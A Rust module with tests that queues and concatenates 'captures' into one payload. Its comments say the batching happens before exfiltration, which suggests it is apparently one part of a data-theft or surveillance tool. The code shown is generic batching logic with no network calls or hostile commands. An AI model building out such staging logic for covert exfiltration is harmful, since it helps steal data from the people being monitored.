// Batch Processing and Queuing
// Batches multiple captures into single payload before exfiltration

use std::sync::Arc;
use tokio::sync::Mutex;
use std::time::{Duration, Instant};
use anyhow::Result;

pub struct BatchConfig {
    pub max_size_bytes: usize,      // Max batch size (default: 5 MB)
    pub max_time_seconds: u64,      // Max time before forcing batch (default: 900 = 15 min)
    pub min_size_bytes: usize,      // Min size before sending (default: 1 KB)
}

impl Default for BatchConfig {
    fn default() -> Self {
        Self {
            max_size_bytes: 5 * 1024 * 1024, // 5 MB
            max_time_seconds: 900,            // 15 minutes
            min_size_bytes: 1024,            // 1 KB
        }
    }
}

pub struct BatchQueue {
    config: Arc<Mutex<BatchConfig>>,
    queue: Arc<Mutex<Vec<Vec<u8>>>>,
    queue_size: Arc<Mutex<usize>>,
    first_item_time: Arc<Mutex<Option<Instant>>>,
}

impl BatchQueue {
    pub fn new(config: BatchConfig) -> Self {
        Self {
            config: Arc::new(Mutex::new(config)),
            queue: Arc::new(Mutex::new(Vec::new())),
            queue_size: Arc::new(Mutex::new(0)),
            first_item_time: Arc::new(Mutex::new(None)),
        }
    }
    
    /// Add data to batch queue
    pub async fn add(&self, data: Vec<u8>) -> Result<()> {
        let mut queue = self.queue.lock().await;
        let mut queue_size = self.queue_size.lock().await;
        let mut first_time = self.first_item_time.lock().await;
        
        // Set first item time if queue was empty
        if first_time.is_none() {
            *first_time = Some(Instant::now());
        }
        
        queue.push(data.clone());
        *queue_size += data.len();
        
        Ok(())
    }
    
    /// Check if batch should be sent (size or time threshold)
    pub async fn should_send(&self) -> bool {
        let config = self.config.lock().await;
        let queue_size = *self.queue_size.lock().await;
        let first_time = self.first_item_time.lock().await;
        
        // Check size threshold
        if queue_size >= config.max_size_bytes {
            return true;
        }
        
        // Check time threshold
        if let Some(first) = *first_time {
            if first.elapsed().as_secs() >= config.max_time_seconds {
                // Also check minimum size
                if queue_size >= config.min_size_bytes {
                    return true;
                }
            }
        }
        
        false
    }
    
    /// Get and clear batch
    pub async fn take_batch(&self) -> Vec<Vec<u8>> {
        let mut queue = self.queue.lock().await;
        let mut queue_size = self.queue_size.lock().await;
        let mut first_time = self.first_item_time.lock().await;
        
        let batch = queue.drain(..).collect();
        *queue_size = 0;
        *first_time = None;
        
        batch
    }
    
    /// Get current batch size
    pub async fn current_size(&self) -> usize {
        *self.queue_size.lock().await
    }
    
    /// Get time since first item
    pub async fn time_since_first(&self) -> Option<Duration> {
        let first_time = self.first_item_time.lock().await;
        first_time.map(|t| t.elapsed())
    }
    
    /// Force send (even if below thresholds)
    pub async fn force_send(&self) -> Vec<Vec<u8>> {
        self.take_batch().await
    }
    
    /// Get batch count
    pub async fn item_count(&self) -> usize {
        let queue = self.queue.lock().await;
        queue.len()
    }
}

/// Batch processor that combines multiple items into single payload
pub struct BatchProcessor {
    queue: Arc<BatchQueue>,
}

impl BatchProcessor {
    pub fn new(config: BatchConfig) -> Self {
        Self {
            queue: Arc::new(BatchQueue::new(config)),
        }
    }
    
    /// Add item to batch
    pub async fn add_item(&self, data: Vec<u8>) -> Result<()> {
        self.queue.add(data).await
    }
    
    /// Check if batch ready
    pub async fn is_ready(&self) -> bool {
        self.queue.should_send().await
    }
    
    /// Process batch into single payload
    pub async fn process_batch(&self) -> Result<Vec<u8>> {
        let items = self.queue.take_batch().await;
        
        if items.is_empty() {
            return Err(anyhow::anyhow!("Batch is empty"));
        }
        
        // Combine all items into single payload
        // In production, this would use Protobuf to combine multiple DataBlobs
        let mut combined = Vec::new();
        
        // Add item count header (4 bytes)
        combined.extend_from_slice(&(items.len() as u32).to_le_bytes());
        
        // Add each item with size prefix
        for item in items {
            combined.extend_from_slice(&(item.len() as u32).to_le_bytes());
            combined.extend_from_slice(&item);
        }
        
        Ok(combined)
    }
    
    /// Get queue statistics
    pub async fn get_stats(&self) -> (usize, usize, Option<Duration>) {
        (
            self.queue.current_size().await,
            self.queue.item_count().await,
            self.queue.time_since_first().await,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_batch_queue() {
        let config = BatchConfig {
            max_size_bytes: 1000,
            max_time_seconds: 60,
            min_size_bytes: 100,
        };
        
        let queue = BatchQueue::new(config);
        
        queue.add(vec![0u8; 500]).await.unwrap();
        assert_eq!(queue.current_size().await, 500);
        assert!(!queue.should_send().await);
        
        queue.add(vec![0u8; 600]).await.unwrap();
        assert_eq!(queue.current_size().await, 1100);
        assert!(queue.should_send().await);
    }
    
    #[tokio::test]
    async fn test_batch_processor() {
        let processor = BatchProcessor::new(BatchConfig::default());
        
        processor.add_item(b"item1".to_vec()).await.unwrap();
        processor.add_item(b"item2".to_vec()).await.unwrap();
        
        let batch = processor.process_batch().await.unwrap();
        assert!(!batch.is_empty());
    }
}


